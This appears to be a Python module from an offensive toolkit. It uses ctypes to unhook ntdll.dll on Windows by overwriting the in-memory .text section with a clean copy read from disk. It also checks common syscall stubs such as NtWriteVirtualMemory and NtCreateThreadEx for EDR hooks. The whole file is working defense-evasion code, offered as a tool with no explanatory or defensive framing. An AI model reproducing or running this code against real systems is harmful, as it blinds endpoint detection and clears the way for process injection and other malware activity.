import ctypes
import os
from ctypes import wintypes

PAGE_READONLY = 0x02
PAGE_EXECUTE_READ = 0x20
FILE_MAP_READ = 0x0004


def unhook_ntdll():
    """Read fresh ntdll.dll .text section from disk and overwrite in-memory hooks."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    k32 = ctypes.windll.kernel32
    buf = ctypes.create_unicode_buffer(260)
    k32.GetSystemDirectoryW(buf, 260)
    ntdll_base = k32.GetModuleHandleW('ntdll.dll')

    h_file = k32.CreateFileW(buf.value + '\\ntdll.dll', 0x80000000, 1, None, 3, 0x80, None)
    if h_file == wintypes.HANDLE(-1).value:
        return '[-] Failed to open ntdll.dll from disk'
    h_map = k32.CreateFileMappingW(h_file, None, PAGE_READONLY, 0, 0, None)
    mapped = k32.MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0)
    if not h_map or not mapped:
        k32.CloseHandle(h_map or 0)
        k32.CloseHandle(h_file)
        return '[-] Failed to map ntdll.dll'

    try:
        pe_off = ctypes.c_uint32.from_address(mapped + 0x3C).value
        nt_hdr = mapped + pe_off
        sec_hdr = nt_hdr + 24 + ctypes.c_uint16.from_address(nt_hdr + 20).value
        for i in range(ctypes.c_uint16.from_address(nt_hdr + 6).value):
            sec = sec_hdr + i * 40
            if (ctypes.c_char * 8).from_address(sec).value != b'.text\x00\x00\x00':
                continue
            raw_off = ctypes.c_uint32.from_address(sec + 20).value
            vir = ctypes.c_uint32.from_address(sec + 12).value
            sz = ctypes.c_uint32.from_address(sec + 8).value
            target = ntdll_base + vir
            src = ctypes.create_string_buffer(sz)
            ctypes.memmove(src, mapped + raw_off, sz)
            old = wintypes.DWORD(0)
            k32.VirtualProtect(target, sz, PAGE_EXECUTE_READ, ctypes.byref(old))
            ctypes.memmove(target, src, sz)
            k32.VirtualProtect(target, sz, old, ctypes.byref(old))
            break
    finally:
        k32.UnmapViewOfFile(mapped)
        k32.CloseHandle(h_map)
        k32.CloseHandle(h_file)
    return '[+] ntdll.dll .text section refreshed from disk'


def check_hooked():
    """Check common ntdll exports for EDR hooks (JMP/CALL at function entry)."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    hooked = []
    targets = [
        'NtAllocateVirtualMemory', 'NtWriteVirtualMemory', 'NtCreateThreadEx',
        'NtProtectVirtualMemory', 'NtOpenProcess', 'NtReadVirtualMemory',
        'NtCreateProcess', 'NtQuerySystemInformation',
    ]
    for name in targets:
        addr = ctypes.windll.kernel32.GetProcAddress(
            ctypes.windll.ntdll._handle, name.encode(),
        )
        if addr and (ctypes.c_ubyte * 1).from_address(addr)[0] in (0xE9, 0xEB, 0xFF, 0xE8):
            hooked.append(name)
    if hooked:
        return f'[!] Hooked: {", ".join(hooked)}'
    return '[-] No hooks detected on common ntdll functions'


def restore_all():
    """Unhook ntdll and verify — full restoration path."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    return '\n'.join([unhook_ntdll(), check_hooked()])
